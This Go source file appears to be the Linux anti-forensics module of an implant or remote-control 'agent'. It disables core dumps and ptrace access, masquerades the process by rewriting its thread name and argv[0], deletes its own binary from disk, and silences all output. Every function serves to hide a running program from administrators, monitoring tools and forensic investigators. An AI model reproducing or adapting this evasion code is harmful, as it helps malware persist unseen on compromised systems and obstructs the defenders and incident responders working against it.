//go:build linux

package agent

import (
	"os"
	"unsafe"

	"golang.org/x/sys/unix"
)

func disableCoreDumps() {
	// Set RLIMIT_CORE to zero so no core file is written on crash.
	_ = unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
	// Mark process as non-dumpable so ptrace and /proc/pid/mem are restricted.
	_ = unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
}

func masqueradeProcess(name string) {
	if name == "" {
		return
	}
	// Set the kernel thread name (visible in ps/top, max 15 bytes + NUL).
	// PR_SET_NAME expects a pointer to a NUL-terminated byte array.
	nameBytes, err := unix.BytePtrFromString(name)
	if err == nil {
		_ = unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(nameBytes)), 0, 0, 0)
	}

	// Overwrite os.Args[0] bytes in place so /proc/self/cmdline is masked.
	if len(os.Args) > 0 {
		arg0 := os.Args[0]
		// Get a pointer to the first byte of the original string header's
		// backing array. This is unsafe but intentional — we're masking argv.
		ptr := unsafe.Pointer(unsafe.StringData(arg0))
		buf := unsafe.Slice((*byte)(ptr), len(arg0))
		n := copy(buf, name)
		for i := n; i < len(buf); i++ {
			buf[i] = ' '
		}
	}
}

func selfDeleteBinary() {
	if len(os.Args) > 0 {
		_ = os.Remove(os.Args[0])
	}
}

func platformOpsec() {}

func silenceOutput() {
	devNull, err := os.OpenFile("/dev/null", os.O_WRONLY, 0)
	if err != nil {
		return
	}
	fd := int(devNull.Fd())
	_ = unix.Dup2(fd, int(os.Stdout.Fd()))
	_ = unix.Dup2(fd, int(os.Stderr.Fd()))
	// Do not close devNull — the fd is held open for the process lifetime
	// and closing it could race with the duped descriptors.
}
